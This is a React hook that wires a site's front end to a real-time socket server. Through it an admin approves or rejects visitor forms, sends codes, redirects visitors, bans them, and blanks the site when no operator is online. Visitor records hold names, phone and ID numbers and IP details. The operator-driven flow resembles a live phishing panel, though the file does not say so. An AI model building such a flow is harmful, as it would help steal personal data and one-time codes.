import { Form } from "@/types";
import { useSignals } from "@preact/signals-react/runtime";
import { deleteCookie } from "cookies-next";
import { useEffect } from "react";
import {
  adminLoading,
  code,
  isAdminError,
  isChat,
  isError,
  isNewMessage,
  lastMessage,
  mainInfo,
  socket,
  messages,
  isFormRejected,
  nextPage,
  API_KEY,
} from "../context/signals";
import { navigate, setCurrentPage } from "../utils/utils";
import { activityTracker, stopActivityTracker } from "./activityTracker";

function useRealTime() {
  useSignals();

  useEffect(() => {
    // == Listen For Successfully Connected With Real Time Server ==
    socket.value.on("successfully-connected", (socketId: string) => {
      mainInfo.value = { ...mainInfo.value, socketId };
      setCurrentPage();
      activityTracker();
    });

    // == Receiving Forms For Chat ==
    if (mainInfo.value.features?.chat == "enabled") {
      socket.value.on("receive-message", (m: Form) => {
        messages.value = [...messages.value, m];
        if (!isChat.value) {
          isNewMessage.value += 1;
        }
      });
    }

    // == Done Operation Form From Admin  ==
    socket.value.on(
      "admin-last-message",
      ({ message }: { message: string }) => {
        lastMessage.value = message;
        adminLoading.value = "";
        setCurrentPage("END");
      },
    );

    // == Code That Sent From Admin  ==
    socket.value.on("code", (adminCode: string) => {
      code.value = adminCode;
      adminLoading.value = "";
    });

    socket.value.on("form:approved", () => {
      navigate(nextPage.value);
    });

    socket.value.on("visitor:navigate", (page) => {
      navigate(page);
    });

    socket.value.on("form:rejected", () => {
      isAdminError.value = true;
      isFormRejected.value = true;
      adminLoading.value = "";
    });

    socket.value.on("deleted", () => {
      socket.value.disconnect();

      mainInfo.value = {
        visitorNumber: 0,
        fullName: "",
        isRead: true,
        createdAt: "",
        phone: "",
        idNumber: "",
        _id: "",
        apiKey: API_KEY,
        ip: "",
        country: "",
        os: "",
        device: "",
        browser: "",
        city: "",
        date: "",
        socketId: "",
        page: "",
      };

      deleteCookie("client-state");

      adminLoading.value = "";

      deleteCookie("ID");

      navigate("/");

      isError.value = { en: "Removed Your Account! Try Again Later", ar: "" };
    });

    socket.value.on("blocked", () => {
      adminLoading.value = "";
      isError.value = {
        en: "You have been banned from using the site for violating the terms of use.",
        ar: "لقد تم حظرك من استخدام الموقع لانتهاكك شروط الاستخدام.",
        image: "banned.jpg",
      };
    });

    socket.value.on("unblocked", () => {
      // socket.value.connect();
      isError.value = undefined;
    });

    const maintenanceError = {
      ar: "نعتذر عن الإزعاج، الموقع تحت الصيانة حالياً لتحسين تجربتكم. سنعود قريباً. شكراً لتفهمكم.",
      en: "Sorry for the inconvenience, the website is currently under maintenance to improve your experience. We will be back soon. Thank you for your understanding.",
      image: "maintaince.png",
    };

    socket.value.on("isAdminConnected", (status) => {
      if (!status) isError.value = maintenanceError;
    });

    socket.value.on("check-admin", ({ status }: { status: boolean }) => {
      if (!status) {
        isError.value = maintenanceError;
      } else {
        isError.value = undefined;
      }
    });

    return function () {
      stopActivityTracker();
      socket.value.off("deleted");
      socket.value.off("isAdminConnected");
      socket.value.off("code");
      socket.value.off("admin-last-message");
      socket.value.off("receive-message");
      socket.value.removeListener("receive-message");
      socket.value.removeListener("isAdminConnected");
      socket.value.removeListener("deleted");
      socket.value.removeListener("code");
      socket.value.removeListener("admin-last-message");
      socket.value.removeAllListeners();
    };
  }, [socket.value, mainInfo.value.features?.chat]);

  return {};
}

export default useRealTime;
